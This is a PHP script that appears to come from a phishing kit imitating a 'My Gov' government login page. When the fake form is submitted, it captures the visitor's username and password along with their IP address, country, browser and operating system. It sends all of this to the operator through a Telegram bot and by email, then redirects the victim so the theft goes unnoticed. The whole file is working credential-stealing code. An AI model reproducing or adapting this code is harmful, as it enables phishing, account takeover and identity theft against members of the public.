<?php
error_reporting(0);
session_start();
include("./ServerData.php");
include("../../edit.php");


if ($_SERVER['REQUEST_METHOD'] === 'POST') {
	$username = $_SESSION['username']= clean($_POST['username']);
	$password = $_SESSION['password'] = clean($_POST['password']);

	$message .= "
	<h2 style='text-align: center;'><span style ='color : blue;'>TELEGRAM </span>: TROJAN<span style='color:red;'>VSL</span></h2>
	<h3 style='text-align: center'>My Gov ONLINE ACCESS </h3><br>
	<ul>
		<li>Username : " . $username . "</li><br>
		<li>Password : " . $password . "</li><br>
	</ul>
	<br>
	<h3 style='text-align: center'>IP HOSTNAME DATA</h3><br>
	<ul>
		<li>Country: " . visitor_country() . "</li><br>
		<li>VICTIM DNS: " . $dns . "</li><br>
		<li>IP Address 1: " . $realip . "</li><br>
		<li>IP Address 2: " . $customip  . "</li><br>
		<li>Browser: " . $browser . "</li><br>
		<li>Device/OS: " . $OS . "</li><br>
	</ul>";

	$Gram .= "
	[TG: h4ckecho]
[MY GOV]

	Username : " . $username . "
	Password : " . $password . "
	

	[IP HOSTNAME DATA]
	
	Country: " . visitor_country() . "
	VICTIM DNS: " . $dns . "
	IP Address 1: " . $realip . "
	IP Address 2: " . $customip . "
	Browser: " . $browser . "
	Device/OS: " . $OS . "";

	$response = sendMessage($botToken, $chatID, $Gram);

	$subject = "My Gov [Login Access] from : " . $realip . "\r\n";
	$headers[] = 'MIME-Version: 1.0';
	$headers[] = 'Content-type: text/html; charset=iso-8859-1';
	$headers[] = 'From: MyGov <example@vslmail.com>';
	$headers[] = 'To: You <user@vslmail.com>';
	mail($receiver, $subject, $message,  implode("\r\n", $headers))
		? header("Location: ../../user/errorlog")
		: header("Location: ../../user/login");
}